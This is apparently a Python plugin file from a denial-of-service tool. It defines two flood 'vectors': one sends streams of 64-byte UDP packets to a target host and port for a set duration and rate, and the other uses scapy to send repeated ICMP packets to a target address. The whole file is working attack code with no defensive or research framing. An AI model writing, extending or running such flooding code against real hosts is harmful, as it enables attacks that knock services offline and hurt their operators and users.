import socket
import time
from _lib.ring1.base import Vector


class UdpFlood(Vector):
    name = "udp-flood"; needs = ["ipv4"]
    def run(self, d, args):
        host = d.get("ipv4") or d.get("ipv6")
        port = d["target"].get("port") or 53
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"\x00" * 64
        sent = 0
        end = time.time() + args.duration
        while time.time() < end:
            try:
                s.sendto(payload, (host, port))
                sent += 1
                if sent % max(1, args.rate) == 0:
                    time.sleep(1)
            except Exception:
                break
        print(f"  udp-flood sent {sent} pkts")


class IcmpFlood(Vector):
    name = "icmp-flood"; needs = ["ipv4"]
    def run(self, d, args):
        try:
            from scapy.all import IP, ICMP, send
        except ImportError:
            return
        host = d.get("ipv4")
        if not host:
            return
        end = time.time() + args.duration
        while time.time() < end:
            send(IP(dst=host) / ICMP() / (b"A" * 32), verbose=False)
            time.sleep(1.0 / max(1, args.rate))
